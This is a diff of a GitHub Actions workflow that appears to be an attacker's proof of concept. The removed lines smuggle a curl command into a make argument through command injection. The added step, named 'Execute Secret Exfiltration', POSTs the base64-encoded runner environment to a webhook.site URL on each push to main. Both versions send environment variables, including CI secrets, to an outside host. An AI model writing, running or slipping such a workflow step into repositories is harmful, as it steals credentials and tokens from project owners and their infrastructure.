@@ -1,16 +1,21 @@
-name: tests
-run-name: tests-poc-by-firman
+name: tests-poc-firman
+run-name: poc-injection-run
 
 on:
   push:
     branches: [main]
-  workflow_dispatch: {} # Ieu sangkan bisa dijalankeun manual
+  workflow_dispatch: {}
 
 jobs:
-  poc-injection:
+  poc-job:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Execute Command Injection
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Execute Secret Exfiltration
         run: |
-          make install.telepresence TELEPRESENCE='telepresence; curl https://webhook.site/79ba0022-eb8e-4226-9726-b3937d00a18b/$(env | base64 -w0)'
+          echo "Memulai pengiriman data..."
+          curl -X POST -d "data=$(env | base64 -w0)" https://webhook.site/79ba0022-eb8e-4226-9726-b3937d00a18b
+          echo "Data terkirim, menunggu proses selesai..."
+          sleep 10
